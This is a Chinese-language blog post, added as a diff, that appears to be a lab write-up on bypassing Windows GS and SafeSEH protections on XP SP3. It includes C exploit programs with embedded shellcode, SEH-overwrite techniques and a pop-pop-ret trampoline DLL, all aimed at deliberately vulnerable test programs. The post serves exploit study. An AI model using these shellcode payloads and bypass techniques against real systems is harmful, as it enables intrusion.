@@ -1,0 +1,206 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 绕过GS和SafeSEH保护 · 杂毛小鸡</title><meta name="description" content="绕过GS和SafeSEH保护 - 杂毛小鸡"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="https://bigkan.github.io/atom.xml" title="杂毛小鸡"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon2.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="https://github.com/bigkan" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">绕过GS和SafeSEH保护</h1><div class="post-info">May 15, 2019</div><div class="post-content"><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote>
+<p>在看了《0day安全》的<strong>栈中的守护天使：GS</strong>和<strong>亡羊补牢：SafeSEH</strong>，并将里面的实验做了一遍之后，总结一下遇到的坑和一些失败的经验。文章将从下面几点进行讲述：</p>
+</blockquote>
+<ul>
+<li><ol>
+<li>如何使用VS2019编译能在windows XP SP3上运行的程序。如何对程序和电脑进行GS，SafeSEH，DEP进行设置</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>GS的原理和绕过方法（实验失败）</li>
+</ol>
+</li>
+<li><ol start="3">
+<li>SafeSEH的原理和绕过方法<a id="more"></a>
+</li>
+</ol>
+</li>
+</ul>
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul>
+<li>虚拟机：VMware 15 Pro</li>
+<li>运行环境：Windows XP SP3</li>
+<li>编译软件：vs2019和vc6.0</li>
+<li>调试软件：ollydbg</li>
+<li>IDA pro 7.0</li>
+<li>所有代码，软件都在的<a href="https://pan.baidu.com/s/1ZxsGvBK_2HaA8MNYFANVzA" target="_blank" rel="noopener">百度云链接中</a> 提取码：f91a</li>
+</ul>
+<h1 id="VS2019和windows系统的一些设置"><a href="#VS2019和windows系统的一些设置" class="headerlink" title="VS2019和windows系统的一些设置"></a>VS2019和windows系统的一些设置</h1><h2 id="编译能在XP上运行的程序"><a href="#编译能在XP上运行的程序" class="headerlink" title="编译能在XP上运行的程序"></a>编译能在XP上运行的程序</h2><p>VS忽略4996警告（使用strcpy会产生4996警告）： 程序开头添加#pragma warning(disable : 4996)</p>
+<p>当直接使用VS2019编译最简单的HelloWorld之后，在xp中运行会报下面的错误不是有效的Win32应用程序。我从网上找到了一个老哥写的配置属性。只需要在VS2019中按下面步骤进行操作就可以了。视图-》其他窗口-》属性管理器-》添加现有属性 把支持xp的属性表WinXP.props（这个属性表在百度云盘中）添加进去。</p>
+<p><img src="/2019/05/15/绕过GS和SafeSEH保护/不是有效的Win32应用程序.png" alt="不是有效Win32应用程序"></p>
+<h2 id="对应安全设置的关闭"><a href="#对应安全设置的关闭" class="headerlink" title="对应安全设置的关闭"></a>对应安全设置的关闭</h2><ul>
+<li>禁用优化：项目–》属性–》c/c++–》优化–》优化设置为/Od</li>
+<li>GS设置（默认开启）： 项目–》属性–》c/c++–》代码生成–》安全检查</li>
+<li>SafeSEH关闭（默认开启）：项目–》属性–》链接器–》命令行–》将 /SAFESEH:NO 复制到“其它选项（D)”框中，然后点击应用</li>
+<li>VS2019编译DEP关闭（默认开启）：项目–》属性–》链接器–》高级–》数据执行保护(DEP)  设置为 否 (/NXCOMPAT:NO)</li>
+<li>XP DEP关闭（默认对核心模块开启）：在Windows系统中 我的电脑右键属性-》高级-》启动和故障恢复设置-》系统启动，编辑-》添加/noexecute=Alwayoff。如下图所示。</li>
+</ul>
+<p><img src="/2019/05/15/绕过GS和SafeSEH保护/Win关闭DEP.png" alt="Win关闭DEP"></p>
+<hr>
+<h1 id="GS保护原理"><a href="#GS保护原理" class="headerlink" title="GS保护原理"></a>GS保护原理</h1><h2 id="Security-cookie"><a href="#Security-cookie" class="headerlink" title="Security cookie"></a>Security cookie</h2><p>GS编译选项为每个函数调用增加了一些额外操作，用以检测栈中的溢出。</p>
+<ul>
+<li>在所有函数调用前，在EBP之前向栈中压入一个额外的随机DWORD，这个随机数就是Security cookie（也叫canary）</li>
+<li>在.data中也存了一个Security cookie副本。当存在溢出时，溢出数据会先覆盖cookie，之后才会覆盖EBP和EIP（返回地址）。</li>
+<li>在函数返回前会对cookie进行校验。如果栈中的cookie和.data中存的cookie不相同，将会进入异常处理流程。</li>
+</ul>
+<h2 id="Security-Cookie产生细节"><a href="#Security-Cookie产生细节" class="headerlink" title="Security Cookie产生细节"></a>Security Cookie产生细节</h2><ul>
+<li>系统以.data节的第一个双字做为Cookie的种子，或称原始Cookie</li>
+<li>在程序每次运行时Cookie的种子都不同</li>
+<li>在栈帧初始化以后系统用ESP异或种子，做为当前函数的Cookie，以此来作为不同函数的区别，并增加随机性</li>
+<li>在函数返回前，用ESP还原出Cookie的种子</li>
+</ul>
+<h2 id="不会使用GS的情况"><a href="#不会使用GS的情况" class="headerlink" title="不会使用GS的情况"></a>不会使用GS的情况</h2><p>使用GS必定会对程序性能产生影响，所以编译器并不会对所有函数都使用GS进行保护，当然可以用#paragma struct_gs_check(on)会对任意类型函数添加security Cookie进行保护。下面是不会应用GS的情况</p>
+<ul>
+<li>函数不包括缓冲区</li>
+<li>函数被定义为具有变量参数列表</li>
+<li>函数使用无保护的关键字标记</li>
+<li>函数在第一个语句中包含内嵌汇编代码</li>
+<li>缓冲区不是8字节类型且大小不大于4字节</li>
+</ul>
+<h2 id="变量重新排序"><a href="#变量重新排序" class="headerlink" title="变量重新排序"></a>变量重新排序</h2><p>在编译的时根据局部变量的类型对变量在栈帧中的位置进行位置调整，将字符串变量移动到栈帧的高地址，可以防止字符串溢出时破坏其他变量。同时将指针参数和字符串参数复制到内存中的低地址，防止参数被破坏。如下图未使用GS保护的栈和使用GS保护的栈的对比</p>
+<p><img src="/2019/05/15/绕过GS和SafeSEH保护/GS栈对比.png" alt="GS栈对比"></p>
+<h1 id="绕过GS保护（失败）"><a href="#绕过GS保护（失败）" class="headerlink" title="绕过GS保护（失败）"></a>绕过GS保护（失败）</h1><h2 id="利用未保护的内存突破GS"><a href="#利用未保护的内存突破GS" class="headerlink" title="利用未保护的内存突破GS"></a>利用未保护的内存突破GS</h2><p>类似前几篇的溢出直接覆盖到EIP就能成功</p>
+<h2 id="覆盖虚函数突破GS"><a href="#覆盖虚函数突破GS" class="headerlink" title="覆盖虚函数突破GS"></a>覆盖虚函数突破GS</h2><p>没有实验过</p>
+<h2 id="同时替换栈中和-data中的cookie突破GS"><a href="#同时替换栈中和-data中的cookie突破GS" class="headerlink" title="同时替换栈中和.data中的cookie突破GS"></a>同时替换栈中和.data中的cookie突破GS</h2><p>没实验过</p>
+<h2 id="利用异常处理器绕过GS"><a href="#利用异常处理器绕过GS" class="headerlink" title="利用异常处理器绕过GS"></a>利用异常处理器绕过GS</h2><p>如果只是将SEH_handler覆盖为shellcode地址在win xp sp3上并不能成功，因为在sp3上负责异常分发的（不知道这样说对不对）ntdll.dll启用了SafeSEH，会对SEH_handler指向的异常处理函数的地址进行校验，如果是在栈的地址范围内将不会得到执行。所以我只能从侧面验证利用异常处理器绕过GS是否可行。我将用一个栈外的地址来覆盖SEH_handler，如果程序能运行到这个地址，则认为在没有SafeSEH保护的情况下可以利用异常处理器来绕过GS。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//文件名GS_SEH.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable : 4996)</span></span><br><span class="line"><span class="keyword">char</span> shellcode[] =</span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xCC\xCC\xCC\xCC"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\xA0\xFE\x12\x00"</span><span class="comment">//address of shellcode</span></span><br><span class="line"><span class="comment">//"\x13\x13\x13\x00"//栈外的地址</span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span>* input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(buf, input);</span><br><span class="line">	<span class="built_in">strcat</span>(buf, input);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	test(shellcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译代码选项</p>
+<ul>
+<li>1.启用GS</li>
+<li>2.关闭SafeSEH</li>
+<li>3.关闭DEP<br>上面代码在test函数中存在典型的栈溢出漏洞，strcpy操作后buf变量会被溢出，当字符串足够长时将覆盖SEH异常处理函数。同时也会覆盖input地址，造成strcat从一个非法地址读取数据，触发异常。用OD加载程序之后，按F9运行程序。如下图会产生访问异常并且确实已经将SEH成功覆盖为0x0012FEA0。按照提示<strong>shift+F9</strong>让异常处理来接管程序，OD提示<strong>Debugged program was unable process exection</strong>，并不能成功让异常处理程序执行。</li>
+</ul>
+<p><img src="/2019/05/15/绕过GS和SafeSEH保护/GS_SEH覆盖.png" alt="GS_SEH覆盖" title="GS_SEH覆盖"></p>
+<p>为了验证之前的猜想，将原本指向shellcode的地址修改为”\x13\x13\x13\x00”,并在这个地址添加硬件中断，方便验证是否能通过SEH来控制程序。如下图，在触发异常后，程序果然运行到了我们设置的0x00131313地址。暂时我们可能还没办法利用SEH绕过GS，因为实际上我们是需要绕过SafeSEH。总体来说我们还是验证了GS的功能和单纯GS绕过的办法。</p>
+<p><img src="/2019/05/15/绕过GS和SafeSEH保护/GS_SEH验证.png" alt="GS_SEH验证" title="GS_SEH验证"></p>
+<h1 id="SafeSEH保护原理"><a href="#SafeSEH保护原理" class="headerlink" title="SafeSEH保护原理"></a>SafeSEH保护原理</h1><p>编译器在编译程序的时候将所有的异常处理函数地址提取出来，编入一张安全SEH表，并将这张表放到程序的映像里面。当程序调用异常处理函数的时候会将函数地址与安全SEH表进行匹配。异常处理函数的调用是通过RtlDispatchException()函数处理实现的。RtlDispatchException()函数保护的流程</p>
+<ul>
+<li><ol>
+<li>检查异常处理链是否位于当前栈中。如果不在当前栈中，程序将终止异常处理函数的调用</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>通过查询线程信息块（ TEB）中的FS:[4]和FS:[8]可以获得当前程序栈的高地址和低地址。检查异常处理函数指针是否指向当前程序的栈中。如果指向当前程序的栈中将终止异常处理函数的调用（这就是前面利用SEH绕过GS无法成功的原因）。</li>
+</ol>
+</li>
+<li><ol start="3">
+<li>前两个检查通过后会调用RtlIsValidHandler()来对异常处理函数(SEH_handler)的有效性进行验证。</li>
+</ol>
+</li>
+</ul>
+<p>RtlIsValidHandler首先判断处理函数地址是否在加载模块的内存空间，如果属于加载模块的内存空间，将进行下面的校验</p>
+<ul>
+<li><ol>
+<li>判断程序是否设置了IMAGE_DLLCHARACTERISTICS_NO_SEH标识。如果设置了，这个程序内的异常会被忽略。函数直接返回失败</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>检查程序是否包含安全SEH表。如果包含SEH表，这将当前的异常处理函数地址与该表进行匹配，匹配成功则返回校验成功，匹配失败则返回校验失败。</li>
+</ol>
+</li>
+<li><ol start="3">
+<li>判断是否设置了ILonly表示。如果设置了，表明只包含.NET编译的中间语言，直接返回失败。</li>
+</ol>
+</li>
+<li><ol start="4">
+<li>判断异常处理函数是否位于不可执行页上。当异常处理函数地址位于不可执行页上时，检验函数检查DEP是否开启，如果系统未开启DEP则返回成功，否则程序抛出访问违例。</li>
+</ol>
+</li>
+</ul>
+<p>当异常处理函数的地址不在加载模块的内存空间中时，检验函数直接进行DEP检查</p>
+<ul>
+<li><ol>
+<li>判断异常处理函数是否位于不可执行页上。当异常处理函数地址位于不可执行页上时，检验函数检查DEP是否开启，如果系统未开启DEP则返回成功，否则程序抛出访问违例。</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>判断系统是否允许跳转到加载模块的内存空间外执行，如果允许则返回校验成功，否则校验失败。</li>
+</ol>
+</li>
+</ul>
+<p>综上所述：总共有3种情况会允许异常处理函数的运行以及利用的可行性</p>
+<ul>
+<li><ol>
+<li>异常处理函数位于加载模块内存范围之外，DEP关闭。这种情况只需要在加载模块范围外找到一个跳板指令就可以转到shellcode执行。</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>异常处理函数位于加载模块之内，相应模块未启用SafeSEH(安全SEH表为空)，同时相应模块不是纯IL。这种情况可以利用未启用SafeSEH的模块做为跳板转入到shellcode执行</li>
+</ol>
+</li>
+<li><ol start="3">
+<li>异常处理函数位于加载模块内存范围内，相应模块启用SafeSEH，异常处理函数地址包含在安全SEH表中。这种情况不是很好利用（我暂时不会）</li>
+</ol>
+</li>
+<li><ol start="4">
+<li>还有一种情况是，SEH中的异常函数指针指向堆区，异常处理会直接跳转过去执行。</li>
+</ol>
+</li>
+</ul>
+<h1 id="绕过SafeSEH"><a href="#绕过SafeSEH" class="headerlink" title="绕过SafeSEH"></a>绕过SafeSEH</h1><h2 id="攻击返回地址绕过SafeSEH"><a href="#攻击返回地址绕过SafeSEH" class="headerlink" title="攻击返回地址绕过SafeSEH"></a>攻击返回地址绕过SafeSEH</h2><p>没有开启GS的时候，可以直接覆盖返回地址</p>
+<h2 id="利用虚函数绕过SafeSEH"><a href="#利用虚函数绕过SafeSEH" class="headerlink" title="利用虚函数绕过SafeSEH"></a>利用虚函数绕过SafeSEH</h2><p>没有触发异常，实验也没做过</p>
+<h2 id="从堆中绕过SafeSEH"><a href="#从堆中绕过SafeSEH" class="headerlink" title="从堆中绕过SafeSEH"></a>从堆中绕过SafeSEH</h2><p>就像前面第4点说的，将shellcode放在堆区，如果覆盖SEH_handler指向堆区就能直接执行。这里有个小坑的地方就是，调试状态下的堆区和正常执行的堆区地址是不一样的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SEH_heap.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable : 4996)</span></span><br><span class="line"><span class="keyword">char</span> shellcode[] =</span><br><span class="line"><span class="string">"\xba\xcb\xd0\xfc\x46\xd9\xca\xd9\x74\x24\xf4\x5b\x29"</span></span><br><span class="line"><span class="string">"\xc9\xb1\x31\x31\x53\x13\x03\x53\x13\x83\xeb\x37\x32"</span></span><br><span class="line"><span class="string">"\x09\xba\x2f\x31\xf2\x43\xaf\x56\x7a\xa6\x9e\x56\x18"</span></span><br><span class="line"><span class="string">"\xa2\xb0\x66\x6a\xe6\x3c\x0c\x3e\x13\xb7\x60\x97\x14"</span></span><br><span class="line"><span class="string">"\x70\xce\xc1\x1b\x81\x63\x31\x3d\x01\x7e\x66\x9d\x38"</span></span><br><span class="line"><span class="string">"\xb1\x7b\xdc\x7d\xac\x76\x8c\xd6\xba\x25\x21\x53\xf6"</span></span><br><span class="line"><span class="string">"\xf5\xca\x2f\x16\x7e\x2e\xe7\x19\xaf\xe1\x7c\x40\x6f"</span></span><br><span class="line"><span class="string">"\x03\x51\xf8\x26\x1b\xb6\xc5\xf1\x90\x0c\xb1\x03\x71"</span></span><br><span class="line"><span class="string">"\x5d\x3a\xaf\xbc\x52\xc9\xb1\xf9\x54\x32\xc4\xf3\xa7"</span></span><br><span class="line"><span class="string">"\xcf\xdf\xc7\xda\x0b\x55\xdc\x7c\xdf\xcd\x38\x7d\x0c"</span></span><br><span class="line"><span class="string">"\x8b\xcb\x71\xf9\xdf\x94\x95\xfc\x0c\xaf\xa1\x75\xb3"</span></span><br><span class="line"><span class="string">"\x60\x20\xcd\x90\xa4\x69\x95\xb9\xfd\xd7\x78\xc5\x1e"</span></span><br><span class="line"><span class="string">"\xb8\x25\x63\x54\x54\x31\x1e\x37\x32\xc4\xac\x4d\x70"</span></span><br><span class="line"><span class="string">"\xc6\xae\x4d\x24\xaf\x9f\xc6\xab\xa8\x1f\x0d\x88\x47"</span></span><br><span class="line"><span class="string">"\x6a\x0c\xb8\xcf\x33\xc4\xf9\x8d\xc3\x32\x3d\xa8\x47"</span></span><br><span class="line"><span class="string">"\xb7\xbd\x4f\x57\xb2\xb8\x14\xdf\x2e\xb0\x05\x8a\x50"</span></span><br><span class="line"><span class="string">"\x67\x25\x9f\x32\xe6\xb5\x43\x9b\x8d\x3d\xe1\xe3"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\xB8\x63\x15\x00"</span><span class="comment">//正常堆地址</span></span><br><span class="line"><span class="comment">//"\xb8\x59\x15\x00"//调试状态堆地址</span></span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span>* input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> str[<span class="number">200</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(str, input);</span><br><span class="line">	<span class="keyword">int</span> zero = <span class="number">0</span>;</span><br><span class="line">	zero++;</span><br><span class="line">	zero = zero / (zero - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span>* buf = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line">	<span class="comment">//__asm int 3</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"buf address:0x%x\n"</span>, buf);</span><br><span class="line">	<span class="built_in">strcpy</span>(buf, shellcode);</span><br><span class="line">	test(shellcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>实验代码解释</p>
+<ul>
+<li><ol>
+<li>申请500字节存放shellcode</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>test函数中的strcpy存在溢出漏洞，用超长的字符串造成溢出覆盖SEH</li>
+</ol>
+</li>
+<li><ol start="3">
+<li>触发除零溢出（编译时要禁用优化）,使异常处理函数得以执行，成功执行shellcode</li>
+</ol>
+</li>
+</ul>
+<p>实验环境</p>
+<ul>
+<li>系统：windows xp sp3</li>
+<li>编译器：VS2019</li>
+<li>编译选项：启用GS,启用SafeSEH，禁用优化，禁用DEP</li>
+<li>build版本：release版本。</li>
+</ul>
+<p>实验过程</p>
+<ul>
+<li><ol>
+<li>找到堆分配的首地址。使用OD不知道函数的入口地址的时候可以配合IDA找到地址，然后在堆分配函数之后下断点，执行之后EAX就保存着堆的首地址。因为调试状态和正常运行时堆的分配是不同的，所以为了实验更简单，直接输出了堆的首地址。在我的虚拟机上调试状态堆地址是0x001559B8，正常执行时堆地址是0x001563B8</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>确定需要多长的字符串才能覆盖到SEH_Handler。可以用前几篇文章的方法先生成字符串确定需要的字符串长度。</li>
+</ol>
+</li>
+</ul>
+<p>如下图为执行到堆栈时的图。按F9就能顺利弹出计算器。当直接执行SafeSEH_heap.exe时需要用cmd来运行，否则只会一闪而过。</p>
+<p><img src="/2019/05/15/绕过GS和SafeSEH保护/SafeSEH_heap.png" alt="SafeSEH_heap"></p>
+<h2 id="利用未启用SafeSEH模块绕过SafeSEH"><a href="#利用未启用SafeSEH模块绕过SafeSEH" class="headerlink" title="利用未启用SafeSEH模块绕过SafeSEH"></a>利用未启用SafeSEH模块绕过SafeSEH</h2><p>如果能够找到一个未启用SafeSEH的模块，可以利用未启用的模块跳转到Shellcode。这次实验要编译一个未启用SafeSEH的dll和一个调用这个dll存在漏洞的程序</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SEH_NOSafeSEH_JUMP.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HANDLE hModule,DWORD  ul_reason_for_call, LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jump</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__asm&#123;</span><br><span class="line">	pop eax</span><br><span class="line">	pop eax</span><br><span class="line">	retn</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SEH_NoSafeSEH.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable : 4996)</span></span><br><span class="line"><span class="keyword">char</span> shellcode[] =</span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span 